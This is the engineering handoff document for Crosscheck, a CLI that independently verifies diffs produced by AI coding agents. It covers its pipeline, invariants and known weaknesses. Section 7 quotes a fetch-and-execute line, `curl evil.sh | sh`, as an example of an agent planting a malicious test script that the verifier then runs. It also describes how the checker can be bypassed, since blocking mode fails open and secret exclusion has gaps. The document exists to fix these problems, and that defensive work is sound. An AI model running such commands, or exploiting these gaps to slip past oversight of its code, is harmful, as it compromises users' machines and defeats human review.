# Crosscheck — State & Handoff

**Last verified:** 9 August 2026
**Branch:** `feat/tree-attribution-and-privacy-seam` → `main`
**Remote:** https://github.com/crosscheck-sh/crosscheck (private)

This document is written for someone picking the project up cold, with their own
Claude. Everything below was verified by running it, not recalled. Where something
is unverified, it says so — please keep that property.

For the commercial side — the free/paid boundary, distribution, licence position
— see [docs/product-strategy.md](docs/product-strategy.md).

---

## 1. What it is

A CLI that wraps any coding-agent command, captures the git diff that command
produced, and independently verifies those changes through four isolated stages,
each a separate LLM call or deterministic pass.

```
crosscheck run -- claude -p "add password reset"
```

The premise: **the system that writes the code should not be the only system
deciding whether it is safe to ship.**

---

## 2. Status in one paragraph

The plumbing is built and green. Lint, typecheck, 74 tests and the build all
pass. The full four-stage pipeline has now been run against a live
`ANTHROPIC_API_KEY` on real content — see §11 — and it works: all three models
returned schema-valid structured output, the Judge produced a reasoned verdict,
and the policy engine applied it. **The product itself is still unvalidated.**
That is n=2 real runs, on one repository. Nobody has measured whether the
verdicts are any good across a corpus. That remains the single most important
open question and everything in §7 is subordinate to it.

---

## 3. Run it right now

No API key needed:

```sh
pnpm install
pnpm build
node dist/index.js demo      # full fake run — no subprocess, no LLM, no network
node dist/index.js doctor    # validates git repo, config, policy, key, allowlist
node dist/index.js dry-run -- claude -p "add a feature"
node dist/index.js status
NO_COLOR=1 node dist/index.js demo   # what CI and piped output look like
```

With a key — this is the part that matters:

```sh
export ANTHROPIC_API_KEY=sk-ant-...
node dist/index.js verify                    # verify the current uncommitted diff
node dist/index.js run -- claude -p "..."    # wrap an agent end to end
```

Checks:

```sh
pnpm check    # lint + typecheck + format:check
pnpm fix      # eslint --fix + prettier
pnpm test
```

---

## 4. How a run works

1. **Snapshot before** — a real git *tree object* for the whole worktree
   (tracked, staged and untracked alike), written to a temp index and temp object
   store so the repository is never touched. This is the baseline.
2. **Run the wrapped command** — transparent subprocess; stdin inherited, signals
   forwarded, colours preserved. The agent has no idea Crosscheck exists.
3. **Snapshot after** — build a second tree and `git diff baseline final`. That
   *is* the attributable diff: pre-existing dirt is already baked into the
   baseline tree, so everything the diff reports is by construction the command's
   doing, down to the hunk. This is the hardest correctness problem in the
   codebase and the most defensible work in it. See §11 for why the previous
   path-set approach could not be made correct.
4. **Pipeline:**
   - **Scout** (LLM) — scope, intent, risk level, what the Reviewer should focus
     on. Recommends verification goals in plain English only; never emits shell.
   - **Builder** (deterministic, no LLM) — detects project type, maps Scout's
     goals to *allowlisted* commands, runs your real build/test/lint, captures
     bounded logs.
   - **Reviewer** (LLM) — reads Scout output, Builder evidence, the diff, and
     historical findings from memory. Emits structured findings with paths, line
     numbers, confidence.
   - **Judge** (LLM) — reads everything prior, returns `pass` / `warn` / `block` /
     `inconclusive`, and may dismiss Reviewer findings it considers unsupported.
   - **Policy engine** (deterministic) — applies thresholds, determines exit code.
5. **Persist** — JSON, Markdown and HTML reports under `.crosscheck/runs/<id>/`;
   findings written to memory for future runs.

### Engineering invariants — do not violate

1. The verifier is independent of the generator.
2. Every finding references concrete evidence.
3. LLM output never reaches shell execution — Builder uses a deterministic
   allowlist only. **Partially true — see §7.** Scout's text never becomes a
   command, but Builder runs `package.json` scripts, which the wrapped agent may
   have just rewritten.
4. Deterministic evidence outranks model opinion.
5. Crosscheck never mutates the repository during verification. **True of
   Crosscheck itself** — tree building uses a temp index and temp object store,
   asserted by a test. Not true of the Builder, which runs your real
   build/test and so can write `dist/`, coverage and snapshots.
6. A stage that did not execute is never reported as passed. Extended: a check
   whose *tool* is missing reports `unavailable`, never `failed` — absence of
   evidence must not read as evidence of a defect.
7. Pre-existing changes are never attributed to the wrapped command. Enforced
   structurally by tree diffing rather than by path arithmetic, so it now holds
   at hunk level, including for a file that was already dirty and then edited
   further.
8. Secrets and excluded paths are redacted before any remote inference. Enforced
   by the type system: `RawPatch` and `SafePatch` are distinct types and only
   `SafePatch` reaches a prompt. Previously this invariant was documented but
   **not actually true** — the sanitiser existed and nothing called it.
9. A failed or interrupted run still leaves a partial report.

---

## 5. Source layout

```
src/
  cli/
    commands/     run, dry-run, init, doctor, status, runs, report, explain,
                  verify, inspect, override, demo, config          (13 files)
    output/       terminal.ts, progress.ts, theme.ts, fake-data.ts
  core/
    run/          run-orchestrator, run-state, run-context, run-pruner
    repository/   git-repository, repository-snapshot, diff-capture,
                  worktree-tree, file-selection, repo-fingerprint
    privacy/      patch-types (RawPatch/SafePatch brands), diff-sanitizer
    execution/    command-runner, signal-forwarding, terminal-bridge, output-capture
    context/      context-selector, context-budget, file-slicer, source-redaction
    pipeline/     verification-pipeline, stage
    policy/       policy-engine, policy-schema, override-engine
    memory/       memory-store, memory-schema, memory-engine
    cache/        verification-cache
    reports/      report-builder, report-renderer, report-renderer-html,
                  report-store, evidence-store
  stages/
    scout/        scout-stage, scout-prompt, scout-schema
    builder/      builder-stage, project-detector, command-planner,
                  command-executor, executable-lookup, log-sanitizer,
                  command-allowlist
    reviewer/     reviewer-stage, reviewer-prompt, reviewer-schema,
                  deterministic-rules/ (7 rules)
    judge/        judge-stage, judge-prompt, judge-schema
  inference/      llm-provider, anthropic-provider, fake-provider, provider-factory
  config/         config-loader, config-schema, defaults
  storage/        local-run-store, paths
  shared/         errors, logger, schemas, hashing, redaction, tokens

datasets/         THREE EMPTY READMEs — see §7
scripts/          install.sh (curl installer), pkg-build.mjs (binaries)
.github/workflows/ ci.yml, crosscheck.yml, release.yml
```

---

## 6. Models & configuration

Stages are tiered by the capability each needs. Defaults live in
`src/config/defaults.ts`:

| Stage | Default model | Why |
|---|---|---|
| Scout | `claude-haiku-4-5` | Cheap triage of the diff |
| Reviewer | `claude-sonnet-5` | The analysis pass |
| Judge | `claude-opus-5` | The verdict is the product |

**Resolution precedence:** `CROSSCHECK_MODEL_<STAGE>` env var → `config.json` →
the default above. The string `configured-through-environment` is a legacy
placeholder written by older `crosscheck init` runs and is treated as "unset".

> **Trap:** Sonnet 5 and Opus 5 think by default, and `max_tokens` caps thinking
> *plus* response together. Reviewer and Judge are set to 16k for this reason.
> If you lower them, verdicts will truncate mid-sentence.

Policy (`.crosscheck/policy.json`): `shadow` (always exit 0), `advisory`
(default — show findings, never block), `blocking` (exit 2 on block).

Exit codes: `0` pass/advisory · `1` internal error · `2` policy block ·
`3` inconclusive · `4` invalid config · `5` wrapped command could not start.

---

## 7. What is NOT done — read this before planning

**The Builder executes scripts the agent just wrote.** `detectProject` reads
`package.json` *after* the wrapped command has run, and the planner turns those
scripts into `pnpm run test` / `lint` / `build`. An agent that writes
`"test": "curl evil.sh | sh"` gets it executed by the verifier. The allowlist in
`command-allowlist.ts` only validates `config.builder.commands` — it never sees
script bodies. This is the most serious known issue in the codebase and it
contradicts invariant 3. Fixing it probably means running the Builder in a
disposable worktree or container, or diffing `package.json` scripts against
their baseline and refusing to run changed ones.

**The core is unvalidated.** The 74 tests are real but offline: `FakeProvider`
throws immediately, so no test exercises a model response. They prove the
pipeline degrades gracefully and that diff attribution and redaction are
correct; they prove nothing about verdict quality. Two real runs, on one repo.
That is n=2.

**`blocking` mode fails open.** If the Judge stage throws, `policy` is left
undefined and the orchestrator falls back to the wrapped command's exit code — so
a run whose verification collapsed exits 0. For a gating tool that is the wrong
default; an infrastructure failure in `blocking` mode should exit 3.

**`datasets/` is three empty READMEs.** The previous version of this document
described "end-to-end fixtures with expected verdicts" and implied only a test
runner was missing. That was wrong — there is nothing to run. Building this is
the highest-value work available, and the way to build it is by hand-labelling
real output (§8).

**Not published to npm.** `npm install -g crosscheck` does not resolve. The name
is free (verified: registry returns 404). Needs `NPM_TOKEN` in repo secrets and a
`v*` tag push to fire `release.yml`.

**Judge does not read memory.** Only the Reviewer queries it, so the traceability
chain the docs describe is half-wired.

**No evaluation harness.** Nothing executes `datasets/evaluation/`.

**Untested / unmeasured:**
- Cost and latency per run — `tokenUsage` is captured per stage and shown in
  `crosscheck inspect`, but never summed or priced. You cannot currently answer
  "what does a run cost?"
- The 60K-token context budget on very large diffs.
- `zodToJsonSchema` against every stage schema on real API responses.
- Whether the Judge actually dismisses anything — the skepticism is designed but
  unobserved.

**Known limitations:**
- `excludePatterns` is a denylist, which fails open, and it is load-bearing for
  the "we don't leak your secrets" claim. The shipped defaults have a concrete
  gap: `.env` matches only at the repository root. `src/.env` and
  `config/.env.local` are **not** excluded. Prefix the patterns with `**/`.
- Redaction is regex-based, so `redactCommandLine` cannot catch a bare
  positional secret (`deploy MYSECRET123`) with no `key=` prefix or vendor
  prefix. Strictly better than the nothing it replaced; not a guarantee.
- Four config keys are declared in the schema and never read:
  `requireBuilderSuccess`, `builder.installDependencies`, `builder.maxLogBytes`,
  `privacy.redactEnvironmentValues`. Silently-ignored privacy settings are worse
  than absent ones — either honour them or delete them.
- Builder commands are split on spaces, so a custom command with a quoted
  argument breaks; and `SHELL_OPERATORS` rejects `\`, so no Windows path can be
  configured.
- `crosscheck verify` does not write `diff.patch`, though `run` does.
- `pnpm format:check` currently fails on ~41 files of pre-existing style drift,
  so the CI `Format check` step is red independently of any change. On Windows
  this looks far worse than it is: with `core.autocrlf=true`, no `.gitattributes`
  and no `endOfLine` in `.prettierrc`, *every* file reads as CRLF and fails
  locally while CI sees LF.
- Binaries cannot be built on Windows — needs Linux CI. Use npm on Windows.
- `memory.json` writes use a file lock that times out after 10s with a warning,
  not a hard error.
- `explain`, `runs`, `inspect`, `status`, `doctor`, `dry-run` still render
  unthemed plain text.

---

## 8. Recommended next step

Do **not** build the eval harness first — you cannot automate a judgement you
have not made by hand yet.

Take 15–20 real agent-generated diffs. Run `crosscheck verify` on each with a
real key. Read every finding and label it true or false positive. That single
exercise yields three things at once: the precision number that decides whether
this is a product, the labelled ground truth that *becomes* `datasets/evaluation/`,
and direct evidence of which of the three prompts is weakest.

False positives are the retention question. A verifier that flags six things
where four are noise gets uninstalled after two runs — worse than nothing,
because the noise teaches people to ignore it.

---

## 9. Conventions in this repo

- **Never send `diff.patch` anywhere.** Use `diff.safePatch`. The type system
  enforces this; if you find yourself casting to get around it, stop.

- **pnpm only.** There is no `package-lock.json`; `npm ci` will fail.
- **Husky + lint-staged** run eslint and prettier on staged files at commit.
- **`prepare` sets up the git hook; `prepack` builds.** Do not move the build back
  into `prepare` — it breaks any `--omit=dev` install (verified: exit 1 → 0).
- **The npm tarball ships 4 files**: `dist/index.js`, README, LICENSE,
  package.json. Sourcemaps are excluded via `!dist/**/*.map` in `files` — they
  embed the full original TypeScript via `sourcesContent`, and this repo is
  private while the package would be public. Do not re-add them.
- **Bundles are minified.** This shrinks output and stops casual reading, but the
  stage prompts remain readable strings in `dist/index.js`. Anything shipped to a
  user's machine can be read; do not treat minification as protection.
- **Terminal styling goes through `src/cli/output/theme.ts`**, which mirrors the
  HTML report's palette so a verdict is the same colour in both. When drawing
  boxes, compute padding on raw strings *before* applying colour — chalk's escape
  codes have no display width and will corrupt alignment.
- **Colour is never the only signal** — severity and verdicts are always spelled
  out as well as tinted, so output survives `NO_COLOR`, CI logs, and colour
  blindness.

---

## 10. What landed before that

Eleven commits on `feat/verification-pipeline2`, newest first:

| Commit | What |
|---|---|
| `85295ec` | Themed spinner with a live elapsed counter |
| `e5e9a3c` | Visual identity: shared theme, wordmark, brand rail |
| `c699504` | Split `prepare`/`prepack` so production installs don't fail |
| `9a7f47b` | Terminal redesign: stage rail, verdict box, inline findings |
| `92b977d` | Minify bundles; widen gitignore |
| `f6c14f6` | Exclude sourcemaps from the npm package |
| `be2fd66` | Release workflow uses pnpm, not `npm ci` |
| `5aa95f0` | Fix install paths, add LICENSE, modernise model defaults |
| `7958240` | CI workflow, git hooks, tooling; fix 11 lint errors + flaky test |
| `5d92080` | PR and issue templates |
| `414d729` | The verification pipeline itself |

Several of these were bugs that would have broken a real user: every install URL
pointed at a repo that doesn't exist, the release workflow would have failed on
its first step, and the npm package would have shipped the entire original
TypeScript source.

---

## 11. Tree attribution and the privacy seam

`worktree-tree.ts` and `diff-sanitizer.ts` had been written on a previous branch
but **nothing imported either of them** — both were dead code, and the privacy
guarantee they were meant to provide was not in effect. This branch wires them
in and closes the resulting gaps.

**Attribution is now tree-based.** Previously: `git status` paths minus paths
dirty at baseline, with the patch coming from `git diff HEAD`. That is only ever
correct at file granularity, and it had four separate defects — a file already
dirty and then edited by the agent was excluded wholesale, so the agent's edit
vanished; `git diff HEAD` never contains untracked files, so
`includeUntrackedFiles` changed the file list but not the patch; a pre-existing
edit to a file larger than `maxFileBytes` was silently skipped from the baseline
and therefore attributed to the command; and `+`/`-` counts came from a regex
that missed added blank lines. Diffing two real tree objects fixes all four
structurally rather than case by case.

**The raw/safe split is a type, not a convention.** `RawPatch` and `SafePatch`
are distinct branded types. Prompts and reports take `SafePatch`; deterministic
secret rules and the Builder cache key deliberately take `RawPatch` — a rule that
only sees `[REDACTED]` can never fire, and hashing a redacted patch collapses
different secrets to one cache key. `prepareSafePatch` is the only route between
them and enforces redact-*then*-truncate, because truncating first can cut a
private-key block before its `-----END`, which both the regex and the block
tracker depend on.

**Verifying the fix found a second leak.** With the diff clean, a smoke test
still showed secrets in `report.{json,md,html}`: `wrappedCommand` was echoed
verbatim into all three *and* into the Scout prompt, so a token passed as a CLI
flag went to the API. Now redacted at those four sites; raw argv is retained in
`metadata.json`, which is local forensics.

**Missing tools no longer masquerade as failures.** The first real end-to-end run
reported `3 failure(s)` and the Judge correctly downgraded the verdict to WARN
for lack of verification signal — but the true cause was that `pnpm` was not on
PATH. On Windows cross-spawn routes an unresolvable command through `cmd.exe`,
which exits 1 identically to a genuine test failure. `executable-lookup.ts` now
resolves the binary first and reports the schema's previously-unused
`unavailable` status, which produces a *limitation* rather than *evidence*.
Builder limitations are now also passed to the Reviewer and Judge prompts, which
never saw them.

**Deliberate design choices, so they are not "fixed" by mistake:**
- `.crosscheck/runs/<id>/diff.patch` stays **unredacted**. It is gitignored,
  local, and a redacted forensic artifact is worse than useless when triaging a
  leak. Everything that leaves the machine is sanitised; this does not leave.
- `commandIntroducedPaths` and `preExistingChangedPaths` may now **overlap**.
  That is the "already dirty, then edited further" case and it is correct. The
  Markdown report marks the overlap explicitly; do not restore the old
  "not attributed to this command" heading, which is now wrong for those files.
- `worktree-tree.ts` calls `git` through `execa`, not `simple-git`. simple-git's
  unsafe-operation guard rejects the module's own hardening flags
  (`-c core.pager`, `-c diff.external`) and any inherited `GIT_EDITOR` or
  `SSH_ASKPASS`. Every argv there is a compile-time constant. The module also
  strips the whole `GIT_*` namespace from the child environment, so running
  Crosscheck inside a git hook cannot retarget the plumbing at the hook's
  repository via an inherited `GIT_DIR` or `GIT_INDEX_FILE`.

**Verified by running it, not by reading it:** 74 tests pass, including a
`--shared` clone case proving blobs resolve through chained
`objects/info/alternates`, and an assertion that the repository's own index and
status are untouched by tree building. A live four-stage run on this diff
returned WARN at 70% confidence; of its ten findings, two were real (both fixed
here), one was disproved by the alternates test above, one was a correctly
identified test fixture, and the rest were low-confidence noise.

---

**This is an early verification system. It is not a guarantee of correctness or
security — and it has not yet been shown to be useful. Please keep this document
honest about that.**
